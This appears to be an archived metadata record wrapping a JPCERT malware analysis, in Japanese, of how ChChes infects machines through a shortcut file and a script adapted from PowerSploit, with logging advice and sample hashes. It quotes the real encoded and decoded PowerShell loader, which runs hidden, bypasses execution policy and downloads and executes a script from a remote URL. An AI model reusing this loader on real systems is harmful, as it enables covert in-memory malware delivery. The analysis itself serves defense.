{
    "id": "51d3f790-f27c-41df-845f-1eff49b47522",
    "created_at": "2023-01-12T15:06:59.378562Z",
    "updated_at": "2025-03-27T02:17:02.267121Z",
    "deleted_at": null,
    "sha1_hash": "de3dc07a26515069b6dfafc4e921e4122088d091",
    "title": "2017-02-10 - PowerSploit",
    "authors": "",
    "file_creation_date": "2022-05-28T23:43:58Z",
    "file_modification_date": "2022-05-28T23:43:58Z",
    "file_size": 3557513,
    "plain_text": "# PowerSploitを悪用して感染するマルウエア(2017-02-10)\n\n**jpcert.or.jp/magazine/acreport-ChChes_ps1.html**\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/ja/shu_tom/)\n\n2017/02/10\n\n[ChChes](https://blogs.jpcert.or.jp/ja/tags/chches/)\n\n[メール](http://10.10.0.46/mailto:?subject=PowerSploit%E3%82%92%E6%82%AA%E7%94%A8%E3%81%97%E3%81%A6%E6%84%9F%E6%9F%93%E3%81%99%E3%82%8B%E3%83%9E%E3%83%AB%E3%82%A6%E3%82%A8%E3%82%A2%282017-02-10%29&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fja%2F2017%2F02%2Fchches_ps1.html)\n\n**PowerSploitを悪用して感染するマルウエア**\n\n今回は、前号の分析センターだより「Cookieヘッダーを用いてC&Cサーバとやりとりする\nマルウエアChChes」で紹介したChChesが、PowerSploit[1]というオープンソースのツール\nを悪用して感染する事例を確認しましたので、その詳細について解説します。\n\n**ChChesが感染するまでの流れ**\n\n今回確認した検体は、ショートカットファイルを悪用してマルウエアの感染を行います。シ\nョートカットファイルが開かれてから、ChChesに感染するまでの流れは、図1のようになり\nます。\n\n\n-----\n\n図 1：ショートカットファイルを開\n\nいてからChChes感染までの流れ\nショートカットファイルが開かれると、PowerShellスクリプトを含むファイルが外部からダ\nウンロードされ、実行されます。次に、PowerShellスクリプト内に含まれるChChesのコー\nド（バージョン1.6.4）が、powershell.exeにインジェクションされ、実行されます。この過\n程の各段階における詳細な挙動を次に解説します。\n\nショートカットファイルが開かれた時の挙動\n\nショートカットファイルを開くと内部に含まれている次のPowerShellスクリプトが実行され\nます。\n```\npowershell.exe -nop -w hidden -exec bypass -enc JAAyAD0AJwAtAG4Abw~省略~\n\n```\n「-enc」以降のPowerShellスクリプトはエンコードされており、以下がデコードしたもので\nす。\n```\n$2='-nop -w hidden -exec bypass -c \"IEX (New-Object\nSystem.Net.Webclient).DownloadString(''https://goo.gl/cpT1NW'')\"';if([IntPtr]::Size eq 8){$3 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"& $3\n$2\";}else{iex \"& powershell $2\";}\n\n```\n上記PowerShellスクリプトによって、指定されているURLからPowerShellスクリプトを含む\nファイルがダウンロードされます。ダウンロードされたスクリプトは32bitのpowershell.exe\n（syswow64\\WindowsPowerShell\\v1.0\\powershell）に読み込まれて実行されます。32bitで\n実行する理由は、PowerShellスクリプト内に含まれるChChesのコードが64bit環境に対応し\nていないためと考えられます。\n\nダウンロードされるPowerShellスクリプトの詳細\n\nダウンロードされるPowerShellスクリプトはPowerSploitの一部（Invoke-Shellcode.ps1）を\n流用して作成されています。PowerSploitは、リモートのコンピュータ上でファイルやコマ\nンドを実行するためのツールで、ペネトレーションテストなどに利用されます。\n\nダウンロードされたPowerShellスクリプトは実行されると、内部に含まれるドキュメントフ\nァイルを%TEMP%フォルダに作成し、表示します。表示するドキュメントファイルはExcel\n文書やWord文書など複数のパターンが存在することを確認しています。\n\n\n-----\n\nさらにPowerShellスクリプトは、内部に含まれるChChesのコードをpowershell.exeにイン\n[ジェクションします。インジェクションされたChChesは前号の分析センターだよりで紹介](https://blogs.jpcert.or.jp/ja/2017/01/ChChes.html)\nした通り、C2サーバから命令とモジュールを受信します。なお、このPowerShellスクリプ\nトやインジェクションされるChChesは、感染端末上でファイルとして保存されないため、\nChChes自身はメモリ上にのみ存在することになります。\n図2はPowerShellスクリプトの一部です。\n\n図 2：ダウンロードされる\n\nPowerShellスクリプト\nイベントログで攻撃の痕跡を確認\n\nWindows 10などPowerShell v5.0がインストールされた環境では、リモートからダウンロー\nドされて実行されたPowerShellスクリプトがデフォルトでイベントログに記録されるように\nなっており、図3のように記録されます。調査を行う際は、このようなイベントログがない\nかご確認ください。\n\n図 3：イベントログに記録される内\n\n容\nこのようなログは、PowerShell v4.0（Windows 8.1のデフォルトバージョン）でも以下のグ\nループポリシーを有効にすることで取得することが可能です。\n\n\n-----\n\nコンピュータの構成 -> 管理用テンプレート -> Windows PowerShell -> PowerShellス\nクリプト ブロックのログ記録を有効にする (Turn on PowerShell Script Block Logging)\n\nおわりに\nPowerShellスクリプトが攻撃に利用されることは一般的になってきました。PowerShell実行\n時のイベントログを取得する設定になっていない場合は、今後このような攻撃の被害にあう\nことを想定して、設定を見直すことを推奨します。また、PowerShellを使用していない場合\nは、AppLockerなどを使用して実行を制限することをご検討下さい。\n\n分析センター 朝長 秀誠\n\n参考情報\n\n[1] PowerSploit\n[https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)\n\n**Appendix A 検体のSHA-256ハッシュ値**\nPowerShell\n\n4ff6a97d06e2e843755be8697f3324be36e1ebeb280bb45724962ce4b6710297\n75ef6ea0265d2629c920a6a1c0d1dd91d3c0eda86445c7d67ebb9b30e35a2a9f\nae0dd5df608f581bbc075a88c48eedeb7ac566ff750e0a1baa7718379941db86\n646f837a9a5efbbdde474411bb48977bff37abfefaa4d04f9fb2a05a23c6d543\n3d5e3648653d74e2274bb531d1724a03c2c9941fdf14b8881143f0e34fe50f03\n9fbd69da93fbe0e8f57df3161db0b932d01b6593da86222fabef2be31899156d\n723983883fc336cb575875e4e3ff0f19bcf05a2250a44fb7c2395e564ad35d48\nf45b183ef9404166173185b75f2f49f26b2e44b8b81c7caf6b1fc430f373b50b\n471b7edbd3b344d3e9f18fe61535de6077ea9fd8aa694221529a2ff86b06e856\naef976b95a8d0f0fdcfe1db73d5e0ace2c748627c1da645be711d15797c5df38\ndbefa21d3391683d7cc29487e9cd065be188da228180ab501c34f0e3ec2d7dfc\n\n[メール](http://10.10.0.46/mailto:?subject=PowerSploit%E3%82%92%E6%82%AA%E7%94%A8%E3%81%97%E3%81%A6%E6%84%9F%E6%9F%93%E3%81%99%E3%82%8B%E3%83%9E%E3%83%AB%E3%82%A6%E3%82%A8%E3%82%A2%282017-02-10%29&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fja%2F2017%2F02%2Fchches_ps1.html)\n\nこの記事の筆者\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/ja/shu_tom/)\n\n外資系ITベンダーでのセキュリティ監視・分析業務を経て、2012年12月から現職。現在\nは、マルウェア分析・フォレンジック調査に従事。主に、標的型攻撃に関するインシデント\n分析を行っている。CODE BLUE、BsidesLV、BlackHat USA Arsenal、Botconf、PacSec、\n\n\n-----\n\nFIRSTなどで講演。JSACオーガナイザー。\n\nこのページは役に立ちましたか？\n\n0人が「このページが役に立った」と言っています。\n\nその他、ご意見・ご感想などございましたら、ご記入ください。\n\nこちらはご意見・ご感想用のフォームです。各社製品については、各社へお問い合わせくだ\nさい。\n\njavascriptを有効にすると、ご回答いただけます。 ありがとうございました。\n\n## 関連記事\n\nHUI Loaderの分析\n\nAnti-UPX Unpackingテクニック\n\nモバイル端末を狙うマルウェアへの対応FAQ\n\n\n-----\n\n攻撃グループLuoYuが使用するマルウェアWinDealer\n\n攻撃グループBlackTechが使用するマルウェアGh0stTimes\n\n≪ [前へ](https://blogs.jpcert.or.jp/ja/2017/01/chches.html)\n[トップに戻る](https://www.jpcert.or.jp/ja/)\n[次へ](https://blogs.jpcert.or.jp/ja/2017/03/impfuzzy_neo4.html) ≫\n\n## ライター\n\n\n関\n口\n\n\n登\n山 昌\n恵田\n中 信\n太郎\n\n\n-----\n\n渕\n上侑\n汰洞\n田 慎\n\n河\n野 一\n之\n\n\n之\n\n\n汰洞\n\n\n岩\n崎 照\n\n\n寺\n本 健\n\n\n-----",
    "language": "JA",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-02-10 - PowerSploit.pdf"
    ],
    "report_names": [
        "2017-02-10 - PowerSploit.pdf"
    ],
    "threat_actors": [
        {
            "id": "2646f776-792a-4498-967b-ec0d3498fdf1",
            "created_at": "2022-10-25T15:50:23.475784Z",
            "updated_at": "2025-03-27T02:00:55.479958Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "BlackTech",
                "Palmerworm"
            ],
            "source_name": "MITRE:BlackTech",
            "tools": [
                "Kivars",
                "PsExec",
                "TSCookie",
                "Flagpro",
                "Waterbear"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d3a7123c-f519-49a0-a234-de24a1ef052a",
            "created_at": "2022-10-25T16:47:55.545211Z",
            "updated_at": "2025-03-27T02:05:17.254744Z",
            "deleted_at": null,
            "main_name": "BRONZE CANAL",
            "aliases": [
                "CTG-6177 ",
                "Circuit Panda ",
                "Palmerworm ",
                "Shrouded Crossbow ",
                "BlackTech"
            ],
            "source_name": "Secureworks:BRONZE CANAL",
            "tools": [
                " DRIGO",
                " Flagpro",
                " Gh0stTimes",
                " PLEAD",
                " Spiderpig",
                " Waterbear",
                "Bifrose"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75024aad-424b-449a-b286-352fe9226bcb",
            "created_at": "2023-01-06T13:46:38.962724Z",
            "updated_at": "2025-03-27T02:00:02.964002Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "CIRCUIT PANDA",
                "Temp.Overboard",
                "G0098",
                "Red Djinn",
                "HUAPI",
                "Palmerworm",
                "T-APT-03",
                "Manga Taurus",
                "Earth Hundun"
            ],
            "source_name": "MISPGALAXY:BlackTech",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e4389aca-6209-443d-9fdc-7ad01c36e3b4",
            "created_at": "2023-01-06T13:46:39.07782Z",
            "updated_at": "2025-03-27T02:00:02.991346Z",
            "deleted_at": null,
            "main_name": "luoxk",
            "aliases": [],
            "source_name": "MISPGALAXY:luoxk",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "efa7c047-b61c-4598-96d5-e00d01dec96b",
            "created_at": "2022-10-25T16:07:23.404442Z",
            "updated_at": "2025-03-27T02:02:09.781478Z",
            "deleted_at": null,
            "main_name": "BlackTech",
            "aliases": [
                "BlackTech",
                "Circuit Panda",
                "Earth Hundun",
                "Manga Taurus",
                "Operation PLEAD",
                "Operation Shrouded Crossbow",
                "Operation Waterbear",
                "Palmerworm",
                "Radio Panda",
                "Red Djinn",
                "T-APT-03",
                "TEMP.Overboard"
            ],
            "source_name": "ETDA:BlackTech",
            "tools": [
                "BIFROST",
                "BUSYICE",
                "BendyBear",
                "Bluether",
                "CAPGELD",
                "DRIGO",
                "Deuterbear",
                "Flagpro",
                "GOODTIMES",
                "Gh0stTimes",
                "IconDown",
                "KIVARS",
                "LOLBAS",
                "LOLBins",
                "Linopid",
                "Living off the Land",
                "TSCookie",
                "Waterbear",
                "XBOW",
                "elf.bifrose"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b72c2616-cc7c-4c47-a83d-6b7866b94746",
            "created_at": "2023-01-06T13:46:39.425297Z",
            "updated_at": "2025-03-27T02:00:03.08718Z",
            "deleted_at": null,
            "main_name": "Red Nue",
            "aliases": [
                "LuoYu"
            ],
            "source_name": "MISPGALAXY:Red Nue",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536019,
    "ts_updated_at": 1743041822,
    "ts_creation_date": 1653781438,
    "ts_modification_date": 1653781438,
    "files": {
        "pdf": "https://archive.orkl.eu/de3dc07a26515069b6dfafc4e921e4122088d091.pdf",
        "text": "https://archive.orkl.eu/de3dc07a26515069b6dfafc4e921e4122088d091.txt",
        "img": "https://archive.orkl.eu/de3dc07a26515069b6dfafc4e921e4122088d091.jpg"
    }
}